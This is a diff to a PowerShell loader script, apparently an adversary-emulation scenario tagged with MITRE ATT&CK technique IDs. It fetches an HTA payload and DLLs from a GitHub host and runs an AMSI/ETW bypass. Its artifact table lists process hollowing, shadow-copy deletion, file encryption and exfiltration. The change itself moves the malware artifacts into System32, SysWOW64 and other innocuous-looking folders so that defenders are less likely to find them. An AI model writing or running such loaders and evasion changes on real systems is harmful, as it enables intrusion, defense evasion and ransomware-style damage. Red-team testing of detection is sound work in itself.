@@ -6,8 +6,17 @@ param(
 $scriptBase = "https://raw.githubusercontent.com/Justanother-engineer/scenario3/main"
 $cleanupUrl = "$scriptBase/cleanup.ps1"
 
-# -- Logging --
-$logFile = "C:\ProgramData\Microsoft\cache\tray\cache.dat"
+# ponytail: artifacts scattered across unsuspicious system dirs (system32,
+# syswow64, windows\temp, public\documents, programdata\...\diagnosis) instead
+# of one staging root. Filenames kept (cache.dat/boot-ok.flag tests rely on
+# them). WFP does not block NEW files in System32/SysWOW64; rename only if a
+# defender name-rule fires.
+$logFile    = "C:\Windows\Temp\cache.dat"
+$htaPath    = "C:\Users\Public\Documents\payload.hta"
+$loaderPath = "C:\Windows\System32\loader.dll"
+$stage2Path = "C:\Windows\SysWOW64\stage2.dll"
+$netTmpPath = "C:\ProgramData\Microsoft\Diagnosis\net.tmp"
+$bootFlag   = "C:\Windows\Temp\boot-ok.flag"
 function Write-Log($msg) {
     $parent = Split-Path $logFile -Parent
     if (-not (Test-Path $parent)) { New-Item -Path $parent -ItemType Directory -Force | Out-Null }
@@ -35,10 +44,11 @@ Write-Log "[*] loader.ps2 started - scriptBase=$scriptBase logFile=$logFile"
 # -- ACL grants (post-run fix: admin-owned log silent failure) --
 $aclTargets = @(
     $logFile,
-    "C:\ProgramData\Microsoft\cache\tray",
-    "C:\ProgramData\Microsoft\cache\tray\loader.dll",
-    "C:\ProgramData\Microsoft\cache\tray\stage2.dll",
-    "C:\ProgramData\Microsoft\cache\tray\payload.hta"
+    (Split-Path $logFile -Parent),
+    $htaPath,
+    $loaderPath,
+    $stage2Path,
+    $netTmpPath
 )
 foreach ($aclPath in $aclTargets) {
     $parent = Split-Path $aclPath -Parent
@@ -71,12 +81,10 @@ function Add-TypeInMem([string]$source) {
 if ($WhatIf) {
     Write-Log "[WHATIF] Skipping AMSI/ETW bypass (child process)"
 } else {
-    $logDir = Split-Path $logFile -Parent
-    $bootFlag = Join-Path $logDir "boot-ok.flag"
     if (Test-Path $bootFlag) { Remove-Item $bootFlag -Force -ErrorAction SilentlyContinue }
 
     $bypassChild = @"
-`$flagPath = 'C:\ProgramData\Microsoft\cache\tray\boot-ok.flag'
+`$flagPath = 'C:\Windows\Temp\boot-ok.flag'
 `$logFile = `$flagPath
 function Write-Log(`$msg) {
     `$parent = Split-Path `$logFile -Parent
@@ -173,7 +181,11 @@ Write-Log "[+] AMSI/ETW bypass step complete"
 
 # -- Scatter directories --
 $scatterDirs = @(
-    "C:\ProgramData\Microsoft\cache\tray"
+    (Split-Path $logFile -Parent),
+    (Split-Path $htaPath -Parent),
+    (Split-Path $loaderPath -Parent),
+    (Split-Path $stage2Path -Parent),
+    (Split-Path $netTmpPath -Parent)
 )
 Write-Log "[*] Creating scatter directories"
 if ($WhatIf) {
@@ -186,11 +198,8 @@ $spoofBase64 = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2Vydmlj
 
 # -- Download artifacts --
 $htaUrl = "$scriptBase/payload.hta"
-$htaPath = "C:\ProgramData\Microsoft\cache\tray\payload.hta"
 $loaderUrl = "$scriptBase/loader.dll"
-$loaderPath = "C:\ProgramData\Microsoft\cache\tray\loader.dll"
 $stage2Url = "$scriptBase/stage2.dll"
-$stage2Path = "C:\ProgramData\Microsoft\cache\tray\stage2.dll"
 
 $downloads = @(
     @{Url=$htaUrl; Path=$htaPath; Name="payload.hta"},
@@ -252,14 +261,14 @@ if (-not $WhatIf) {
 }
 
 $artifacts = @{
-    "T1055.012 PPID spoof (mshta HTA)"   = "C:\ProgramData\Microsoft\cache\tray\payload.hta"
+    "T1055.012 PPID spoof (mshta HTA)"   = $htaPath
     "T1105 certutil download"            = (Join-Path $env:TEMP "loader.dll")
-    "T1055.012 process hollowing"        = "C:\ProgramData\Microsoft\cache\tray\stage2.dll"
+    "T1055.012 process hollowing"        = $stage2Path
     "T1490 shadow copy (vssadmin)"       = "log:T1490"
     "T1486 file encrypt (.govinda)"      = "log:T1486"
     "T1041 HTTP exfil (github.com)"      = "log:T1041"
-    "T1074.001 staging scatter"          = "C:\ProgramData\Microsoft\cache\tray\net.tmp"
-    "T1018 remote system discovery"      = "C:\ProgramData\Microsoft\cache\tray\net.tmp"
+    "T1074.001 staging scatter"          = $netTmpPath
+    "T1018 remote system discovery"      = $netTmpPath
     "T1087 account discovery"            = "log:T1087"
     "T1082 system info discovery"        = "log:T1082"
     "T1053.005 scheduled task"           = "log:T1053"
